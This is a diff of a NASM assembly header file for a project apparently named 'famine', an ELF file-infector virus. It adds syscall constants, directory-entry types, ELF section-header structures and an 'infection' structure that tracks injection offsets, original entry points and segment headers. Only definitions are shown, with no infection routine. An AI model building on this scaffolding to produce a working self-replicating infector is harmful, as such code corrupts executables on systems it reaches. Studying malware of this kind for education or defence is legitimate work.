@@ -6,12 +6,13 @@
 %define		SYS_LSEEK		8
 %define		SYS_MMAP		9
 %define		SYS_UNMAP		11
-%define     SYS_EXIT        60
-%define     SYS_GETDENTS    217
 %define     SYS_SOCKET      41
 %define     SYS_CONNECT     42
 %define     SYS_SENDTO      44
 %define     SYS_RECVFROM    45
+%define     SYS_EXIT        60
+%define		SYS_FTRUNCATE	77
+%define     SYS_GETDENTS    217
 
 ; SOCKET
 %define     AF_INET         2
@@ -26,12 +27,12 @@
 
 ; DIRENT
 %define		D_INO_OFF			0x00
+%define     D_FOLDER            0x4
 %define		D_OFF_OFF			0x08
+%define     D_REG_FILE          0x8
 %define		D_RECLEN_OFF		0x10
 %define		D_TYPE  			0x12
 %define		D_NAME  			0x13
-%define     D_FOLDER            0x4
-%define     D_REG_FILE          0x8
 
 ; MMAP
 %define		PROT_EXEC		1
@@ -45,6 +46,8 @@
 %define		SEEK_SET			0x0
 %define		SEEK_END			0x2
 
+%define		CODE_LEN		(_end - _start)
+%define		FINJMP_OFF		(_bf_exit - _start)
 %define     PAGE_SIZE           0x1000
 
 %define		FAM(x)				[(rbp - famine_size) + x]
@@ -64,15 +67,35 @@ struc famine
     .dirents_struct_ptr resq    1
 endstruc
 
-
 struc infection
-	.file_fd	resq	1
-	.map		resq	1
-	.map_size	resq	1
+	.file_fd			resq	1
+	.map_addr			resq	1
+	.map_size			resq	1
+	.seg_nb				resb	1
+	.seg_hdr_addr		resq	1
+	.last_seg_hdr_addr	resq	1
+	.injection_offset	resq	1
+	.injection_addr		resq	1
+	.sec_hdr_addr		resq	1	
+	.original_entry 	resq	1
+	.original_end		resq	1
+	.add_page			resb	1
+	.mem_eof			resq	1
+	.shstrtab_addr		resq	1
+	.got_str_index		resq	1
 endstruc
 
-%define	PT_LOAD	0x1
-%define PF_X	0x1
+; ELF structures
+%define	PT_LOAD		0x1
+%define	PT_NOTE		0x4
+%define PF_X		0x1
+%define PF_R		0x4
+%define SHT_PROGBITS 0x1
+%define SHT_STRTAB	0x3
+%define SHT_NOTE	0x7
+%define SHT_RELA	0x4
+%define SHF_ALLOC	0x2
+%define SHF_EXECINSTR 0x4
 
 struc	elf64_ehdr
 	.e_ident:		resb	16
@@ -102,33 +125,18 @@ struc	elf64_phdr
 	.p_align:		resq	1
 endstruc
 
-%macro writeWork 0
-    call _strlen
-    mov rdx, rax
-    mov rax, 1
-    mov rdi, 1
-    syscall
-%endmacro
-
-%macro writeBack 0
-    mov rax, 1
-    mov rdi, 1
-    mov r13, rsi
-    mov rsi, back
-    mov rdx, 1
-    syscall
-    mov rsi, r13
-%endmacro
-
-%macro writeSlash 0
-    mov rax, 1
-    mov rdi, 1
-    mov r13, rsi
-    mov rsi, slash
-    mov rdx, 1
-    syscall
-    mov rsi, r13
-%endmacro
+struc elf64_shdr
+	.sh_name:		resd	1
+	.sh_type:		resd	1
+	.sh_flags:		resq	1
+	.sh_addr:		resq	1
+	.sh_offset:		resq	1
+	.sh_size:		resq	1
+	.sh_link:		resd	1
+	.sh_info:		resd	1
+	.sh_addralign	resq	1
+	.sh_entsize		resq	1
+endstruc
 
 %macro PUSHA 0
 	push rax
